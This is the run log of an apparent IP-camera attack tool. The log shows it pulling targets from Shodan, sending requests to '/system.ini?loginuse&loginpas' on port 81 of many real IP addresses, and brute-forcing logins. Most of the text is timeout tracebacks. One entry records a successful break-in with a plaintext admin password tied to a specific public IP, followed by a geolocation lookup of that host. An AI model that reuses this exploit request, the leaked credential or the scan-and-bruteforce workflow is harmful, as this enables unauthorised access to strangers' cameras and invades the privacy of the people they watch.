+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 504, in send
+    raise ConnectTimeout(e, request=request)
+requests.exceptions.ConnectTimeout: HTTPConnectionPool(host='8.142.13.77', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000D8C2CF2D60>, 'Connection to 8.142.13.77 timed out. (connect timeout=10)'))
+
+ERROR:root:[2023-04-25 21:36:58.488638]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
+    conn = connection.create_connection(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
+    raise err
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
+    sock.connect(sa)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
+    self.connect()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
+    conn = self._new_conn()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 164, in _new_conn
+    raise ConnectTimeoutError(
+urllib3.exceptions.ConnectTimeoutError: (<urllib3.connection.HTTPConnection object at 0x000000D8C2CF2CA0>, 'Connection to 39.104.17.124 timed out. (connect timeout=10)')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='39.104.17.124', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000D8C2CF2CA0>, 'Connection to 39.104.17.124 timed out. (connect timeout=10)'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 504, in send
+    raise ConnectTimeout(e, request=request)
+requests.exceptions.ConnectTimeout: HTTPConnectionPool(host='39.104.17.124', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000D8C2CF2CA0>, 'Connection to 39.104.17.124 timed out. (connect timeout=10)'))
+
+ERROR:root:[2023-04-25 21:37:15.547206]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 426, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 421, in _make_request
+    httplib_response = conn.getresponse()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1347, in getresponse
+    response.begin()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 307, in begin
+    version, status, reason = self._read_status()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 268, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 410, in increment
+    raise six.reraise(type(error), error, _stacktrace)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\packages\six.py", line 735, in reraise
+    raise value
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 428, in _make_request
+    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 335, in _raise_timeout
+    raise ReadTimeoutError(
+urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='47.104.90.222', port=81): Read timed out. (read timeout=10)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 529, in send
+    raise ReadTimeout(e, request=request)
+requests.exceptions.ReadTimeout: HTTPConnectionPool(host='47.104.90.222', port=81): Read timed out. (read timeout=10)
+
+INFO:root:[2023-04-25 21:37:26.177460]: Bruteforce started.
+
+INFO:root:[2023-04-25 21:37:40.176130]: Accessed: 93.14.78.249 ('admin', 'Ouffyy6407')
+
+INFO:geocoder.base:Requested http://ipinfo.io/93.14.78.249/json
+INFO:root:[2023-04-25 21:37:40.630744]: Shutdown
+
+INFO:root:2023-04-25 21:44:34.246306: Program started.
+
+INFO:root:[2023-04-25 21:44:34.483270]: Modules imported successfully.
+
+INFO:root:[2023-04-25 21:44:34.617426]: Search operation started without arguments.
+
+INFO:root:[2023-04-25 21:44:36.064560]: Received camera data from Shodan.
+
+INFO:root:[2023-04-25 21:44:36.064560]: Camera sweeps have begun.
+
+ERROR:root:[2023-04-25 21:44:47.557605]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
+    conn = connection.create_connection(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
+    raise err
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
+    sock.connect(sa)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
+    self.connect()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
+    conn = self._new_conn()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 164, in _new_conn
+    raise ConnectTimeoutError(
+urllib3.exceptions.ConnectTimeoutError: (<urllib3.connection.HTTPConnection object at 0x000000BFBDD80CA0>, 'Connection to 47.253.113.46 timed out. (connect timeout=10)')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='47.253.113.46', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000BFBDD80CA0>, 'Connection to 47.253.113.46 timed out. (connect timeout=10)'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 504, in send
+    raise ConnectTimeout(e, request=request)
+requests.exceptions.ConnectTimeout: HTTPConnectionPool(host='47.253.113.46', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000BFBDD80CA0>, 'Connection to 47.253.113.46 timed out. (connect timeout=10)'))
+
+ERROR:root:[2023-04-25 21:44:59.589204]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 426, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 421, in _make_request
+    httplib_response = conn.getresponse()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1347, in getresponse
+    response.begin()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 307, in begin
+    version, status, reason = self._read_status()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 268, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 410, in increment
+    raise six.reraise(type(error), error, _stacktrace)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\packages\six.py", line 735, in reraise
+    raise value
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 428, in _make_request
+    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 335, in _raise_timeout
+    raise ReadTimeoutError(
+urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='8.216.33.16', port=81): Read timed out. (read timeout=10)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 529, in send
+    raise ReadTimeout(e, request=request)
+requests.exceptions.ReadTimeout: HTTPConnectionPool(host='8.216.33.16', port=81): Read timed out. (read timeout=10)
+
+ERROR:root:[2023-04-25 21:45:15.693770]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 426, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 421, in _make_request
+    httplib_response = conn.getresponse()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1347, in getresponse
+    response.begin()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 307, in begin
+    version, status, reason = self._read_status()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 268, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 410, in increment
+    raise six.reraise(type(error), error, _stacktrace)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\packages\six.py", line 735, in reraise
+    raise value
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 428, in _make_request
+    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 335, in _raise_timeout
+    raise ReadTimeoutError(
+urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='119.23.141.223', port=81): Read timed out. (read timeout=10)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 529, in send
+    raise ReadTimeout(e, request=request)
+requests.exceptions.ReadTimeout: HTTPConnectionPool(host='119.23.141.223', port=81): Read timed out. (read timeout=10)
+
+ERROR:root:[2023-04-25 21:45:29.774174]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
+    conn = connection.create_connection(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
+    raise err
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
+    sock.connect(sa)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
+    self.connect()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
+    conn = self._new_conn()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 164, in _new_conn
+    raise ConnectTimeoutError(
+urllib3.exceptions.ConnectTimeoutError: (<urllib3.connection.HTTPConnection object at 0x000000BFBEA8E280>, 'Connection to 98.57.10.101 timed out. (connect timeout=10)')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='98.57.10.101', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000BFBEA8E280>, 'Connection to 98.57.10.101 timed out. (connect timeout=10)'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 504, in send
+    raise ConnectTimeout(e, request=request)
+requests.exceptions.ConnectTimeout: HTTPConnectionPool(host='98.57.10.101', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000BFBEA8E280>, 'Connection to 98.57.10.101 timed out. (connect timeout=10)'))
+
+ERROR:root:[2023-04-25 21:45:51.769010]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
+    conn = connection.create_connection(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
+    raise err
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
+    sock.connect(sa)
+ConnectionRefusedError: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
+    self.connect()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
+    conn = self._new_conn()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 171, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x000000BFBEA91370>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='8.216.32.18', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000000BFBEA91370>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 516, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='8.216.32.18', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000000BFBEA91370>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение'))
+
+INFO:root:[2023-04-25 21:45:52.869813]: Shutdown
+
+INFO:root:2023-04-25 21:46:51.392177: Program started.
+
+INFO:root:[2023-04-25 21:46:51.559685]: Modules imported successfully.
+
+INFO:root:[2023-04-25 21:46:51.689233]: Search operation started without arguments.
+
+INFO:root:[2023-04-25 21:46:53.124658]: Received camera data from Shodan.
+
+INFO:root:[2023-04-25 21:46:53.125659]: Camera sweeps have begun.
+
+ERROR:root:[2023-04-25 21:47:29.308868]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
+    conn = connection.create_connection(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
+    raise err
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
+    sock.connect(sa)
+socket.timeout: timed out
+
